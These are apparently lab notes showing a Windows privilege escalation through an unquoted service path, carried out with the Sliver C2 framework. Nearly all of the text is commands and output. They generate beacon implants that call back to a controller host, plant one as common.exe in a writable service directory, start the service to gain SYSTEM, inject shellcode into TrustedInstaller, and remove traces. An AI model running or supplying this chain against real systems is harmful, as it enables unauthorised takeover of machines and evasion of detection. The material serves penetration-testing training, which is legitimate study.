# Sliver

## 01 - Enumerate

### 1.1 - Armory Extension

```
sliver (OTHER_GLOCKENSPIEL) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon OTHER_GLOCKENSPIEL (1d9fb5cd)

sliver (OTHER_GLOCKENSPIEL) > sharpup audit UnquotedServicePath

[*] Tasked beacon OTHER_GLOCKENSPIEL (25809ae1)

[+] OTHER_GLOCKENSPIEL completed task 25809ae1

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Unquoted Paths ===
        Service 'unquotedsvc' (StartMode: Manual) has executable 'C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe', but 'C:\Program Files\Unquoted Path Service\Common' is modifable.



[*] Completed Privesc Checks in 0 seconds
```

## 02 - Exploit

```
sliver (OTHER_GLOCKENSPIEL) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/user/BEWILDERED_ALDER.exe

sliver (OTHER_GLOCKENSPIEL) > upload BEWILDERED_ALDER.exe 'C:\\program files\\unquoted path service\\common.exe'

[*] Tasked beacon OTHER_GLOCKENSPIEL (aea08c3d)

[+] OTHER_GLOCKENSPIEL completed task aea08c3d

[*] Wrote file to C:\program files\unquoted path service\common.exe

sliver (OTHER_GLOCKENSPIEL) > execute sc start unquotedsvc

[*] Tasked beacon OTHER_GLOCKENSPIEL (3569c8ef)

[+] OTHER_GLOCKENSPIEL completed task 3569c8ef

[*] Command executed successfully

[*] Beacon 83f89bab BEWILDERED_ALDER - 10.10.207.66:49884 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:45:36 EST

sliver (OTHER_GLOCKENSPIEL) > background

[*] Background ...
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: 07ac6680-0b28-4f88-b0c0-c6961eb21364  OTHER_GLOCKENSPIEL  10.10.207.66:49711  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (07ac6680-0b28-4f88-b0c0-c6961eb21364)

sliver > beacons rm

? Select a beacon: 83f89bab-84ca-4c7c-91e6-52827e86dfad  BEWILDERED_ALDER   10.10.207.66:49884  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (83f89bab-84ca-4c7c-91e6-52827e86dfad)

sliver > use 83f89bab-84ca-4c7c-91e6-52827e86dfad

[*] Active beacon BEWILDERED_ALDER (83f89bab-84ca-4c7c-91e6-52827e86dfad)

sliver (BEWILDERED_ALDER) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon BEWILDERED_ALDER (e711480c)

[*] BEWILDERED_ALDER completed task e711480c
```

## 03 - Cleanup

```
sliver (BEWILDERED_ALDER) > ps

[*] Tasked beacon BEWILDERED_ALDER (0950167f)

[+] BEWILDERED_ALDER completed task 0950167f

 Pid    Ppid   Owner                          Arch     Executable               Session
====== ====== ============================== ======== ======================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 540    532    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 588    532    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 596    580    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 624    580    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 684    588    NT AUTHORITY\SYSTEM            x86_64   services.exe
 692    588    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 704    588    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 788    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 852    684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 936    624    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 952    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1004   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 384    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1092   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1224   684    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1364   684    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1476   684    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1504   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1652   684    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1952   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1972   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1064   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2588   684    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2820   2812   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2844   2812   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2132   684    TCM-PC\user                    x86_64   taskhost.exe
 2428   1092   TCM-PC\user                    x86_64   rdpclip.exe
 2616   1004   TCM-PC\user                    x86_64   dwm.exe
 2640   2476   TCM-PC\user                    x86_64   explorer.exe
 2008   684    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2004   684    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1460   684    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 4028   2572   TCM-PC\user                    x86_64   powershell.exe
 1384   2820   TCM-PC\user                    x86_64   conhost.exe
 3716   944    TCM-PC\user                    x86_64   OTHER_GLOCKENSPIEL.exe
 1824   684    NT AUTHORITY\SYSTEM            x86_64   common.exe

sliver (BEWILDERED_ALDER) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/VICTORIOUS_POWDER.bin

sliver (BEWILDERED_ALDER) > execute-shellcode -p 2588 VICTORIOUS_POWDER.bin

[*] Tasked beacon BEWILDERED_ALDER (8f0005a2)

[+] BEWILDERED_ALDER completed task 8f0005a2

[*] Executed shellcode on target

[*] Beacon b9f30555 VICTORIOUS_POWDER - 10.10.207.66:50034 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:51:18 EST

sliver (BEWILDERED_ALDER) > use b9f30555-40a8-440a-80be-ed526fa89394

[*] Active beacon VICTORIOUS_POWDER (b9f30555-40a8-440a-80be-ed526fa89394)
```

Switch to interactive mode

```
sliver (VICTORIOUS_POWDER) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon VICTORIOUS_POWDER (9dbd2dc4)

[*] Session fc6ddcab VICTORIOUS_POWDER - 10.10.207.66:50049 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:51:41 EST

sliver (VICTORIOUS_POWDER) > sessions -i f

[*] Active session VICTORIOUS_POWDER (fc6ddcab)

sliver (VICTORIOUS_POWDER) > terminate 3716

[*] Process 3716 has been terminated

sliver (VICTORIOUS_POWDER) > rm 'C:\\program files\\unquoted path service\\common.exe'

[*] C:\program files\unquoted path service\common.exe
```